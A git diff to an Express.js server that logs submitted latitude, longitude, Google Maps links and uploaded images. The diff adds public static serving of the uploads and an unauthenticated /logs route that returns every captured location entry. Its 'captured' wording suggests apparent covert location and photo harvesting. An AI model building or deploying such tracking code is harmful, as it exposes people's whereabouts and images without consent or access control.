@@ -13,6 +13,11 @@ if (!fs.existsSync("uploads")) {
 }
 
 /* =========================
+   SERVE UPLOADED IMAGES
+========================= */
+app.use("/uploads", express.static("uploads"));
+
+/* =========================
    MULTER STORAGE CONFIG
 ========================= */
 const storage = multer.diskStorage({
@@ -28,7 +33,10 @@ const storage = multer.diskStorage({
 const upload = multer({
   storage,
   fileFilter: (req, file, cb) => {
-    if (file.mimetype === "image/png" || file.mimetype === "image/jpeg") {
+    if (
+      file.mimetype === "image/png" ||
+      file.mimetype === "image/jpeg"
+    ) {
       cb(null, true);
     } else {
       cb(new Error("Only PNG and JPEG allowed"));
@@ -59,12 +67,24 @@ Time: ${new Date().toISOString()}
 Latitude: ${latitude}
 Longitude: ${longitude}
 Google Maps: ${mapLink}
-Image File: ${req.file.filename}
+Image URL: /uploads/${req.file.filename}
 -------------------------
 `;
 
   fs.appendFileSync("location-log.txt", log);
-  res.sendStatus(200);
+  res.status(200).send("Captured successfully");
+});
+
+/* =========================
+   VIEW LOGS ONLINE
+========================= */
+app.get("/logs", (req, res) => {
+  if (!fs.existsSync("location-log.txt")) {
+    return res.send("No data captured yet.");
+  }
+
+  const data = fs.readFileSync("location-log.txt", "utf8");
+  res.type("text").send(data);
 });
 
 /* =========================
